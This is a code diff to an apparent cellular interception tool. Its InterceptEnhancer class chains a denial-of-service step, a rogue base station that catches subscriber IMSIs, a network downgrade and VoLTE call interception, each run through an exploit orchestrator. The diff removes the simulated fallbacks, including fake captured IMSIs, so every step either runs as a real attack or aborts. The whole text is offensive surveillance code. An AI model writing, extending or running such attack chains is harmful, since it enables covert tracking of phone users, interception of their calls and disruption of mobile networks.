@@ -228,11 +228,18 @@ class InterceptEnhancer:
             
             if self.orchestrator:
                 dos_result = self.orchestrator.execute_exploit('dos', dos_params)
-                result['steps'].append({'step': 'dos', 'success': dos_result.get('success', False)})
+                if dos_result.get('success', False):
+                    result['steps'].append({'step': 'dos', 'success': True})
+                else:
+                    self.logger.error("DoS exploit failed")
+                    result['steps'].append({'step': 'dos', 'success': False, 'error': 'exploit_failed'})
+                    result['success'] = False
+                    return result
             else:
-                self.logger.warning("Orchestrator not available - simulating DoS")
-                time.sleep(dos_duration)
-                result['steps'].append({'step': 'dos', 'success': True, 'simulated': True})
+                self.logger.error("Orchestrator not available - cannot execute DoS. Chain aborted.")
+                result['steps'].append({'step': 'dos', 'success': False, 'error': 'orchestrator_missing'})
+                result['success'] = False
+                return result
             
             # Step 2: Activate rogue base station during recovery
             self.logger.info("Step 2: Activating rogue base station for IMSI catching")
@@ -246,11 +253,18 @@ class InterceptEnhancer:
             if self.orchestrator:
                 imsi_result = self.orchestrator.execute_exploit('rogue_cell', imsi_params)
                 captured_imsis = imsi_result.get('captured_imsis', [])
-                result['steps'].append({'step': 'imsi_catch', 'success': True, 'count': len(captured_imsis)})
+                if captured_imsis:
+                    result['steps'].append({'step': 'imsi_catch', 'success': True, 'count': len(captured_imsis)})
+                else:
+                    self.logger.warning("No IMSIs captured during rogue cell operation")
+                    result['steps'].append({'step': 'imsi_catch', 'success': False, 'count': 0})
             else:
-                # Simulate capture
-                captured_imsis = [f"00101012345678{i}" for i in range(3)]  # Simulated
-                result['steps'].append({'step': 'imsi_catch', 'success': True, 'count': 3, 'simulated': True})
+                # No orchestrator - cannot capture real data
+                self.logger.error("Orchestrator required for IMSI capture - chain aborted")
+                captured_imsis = []
+                result['steps'].append({'step': 'imsi_catch', 'success': False, 'error': 'orchestrator_missing'})
+                result['success'] = False
+                return result
             
             # Step 3: Hash all captures with evidence chain
             if self.evidence_chain and captured_imsis:
@@ -349,9 +363,18 @@ class InterceptEnhancer:
             
             if self.orchestrator:
                 downgrade_result = self.orchestrator.execute_exploit('downgrade', downgrade_params)
-                result['steps'].append({'step': 'downgrade', 'success': downgrade_result.get('success', False)})
+                if downgrade_result.get('success', False):
+                    result['steps'].append({'step': 'downgrade', 'success': True})
+                else:
+                    self.logger.error("Downgrade attack failed")
+                    result['steps'].append({'step': 'downgrade', 'success': False, 'error': 'downgrade_failed'})
+                    result['success'] = False
+                    return result
             else:
-                result['steps'].append({'step': 'downgrade', 'success': True, 'simulated': True})
+                self.logger.error("Orchestrator required for downgrade attack - chain aborted")
+                result['steps'].append({'step': 'downgrade', 'success': False, 'error': 'orchestrator_missing'})
+                result['success'] = False
+                return result
             
             # Step 2: VoLTE interception on downgraded connection
             self.logger.info(f"Step 2: Intercepting VoLTE streams on {downgrade_to}")
